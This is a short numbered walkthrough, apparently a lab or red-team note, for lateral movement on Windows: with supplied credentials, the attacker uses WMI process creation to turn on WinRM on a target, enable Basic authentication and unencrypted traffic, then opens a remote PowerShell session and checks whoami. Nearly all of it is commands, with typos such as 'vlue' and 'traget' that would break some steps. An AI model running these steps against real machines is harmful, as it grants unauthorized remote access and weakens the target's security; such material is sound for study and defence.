1. On the attacked machine start cmd as administrator
2. Access powershell - powershell
3. Stop the WinRM service - stop-service winrm
4. On the attacker machine access a privileged cmd and verify WinRM service is enabled - winrm qc
5. access powershell - powershell
6. Verify the targeted pc is trusted host - set-item wsman:\localhost\client\trustedhosts -value ["target pc name"]
7. Rastart the WinRM service to apply changes - restart-service winrm
8. Define credentials and the following commands into variables:
	$password = convertto-securestring ["password"] -asplaintext -force
	$cred = new-object system.management.automation.pscredential(["user"], $password)
	$command = "cmd /c powershell.exe -c set-wsmanquickconfig -force;set-item wsman:\localhost\service\auth\basic -value '$true;set-item wsman:\localhost\service\allowunencrypted -vlue '$true;register-pssessionconfiguration -name microsoft.powershell -force"
9. Use Wmi in order to activate the traget's WinRM service - invoke-wmimethod -path "win32_process" -name "create" -computername [target name] -credential $cred -argumentlist $command
10. Use enter-PSSession in order to access the remote machine over WinRM - enter-pssession -computername [computer name] -credential $cred
11. Check whoami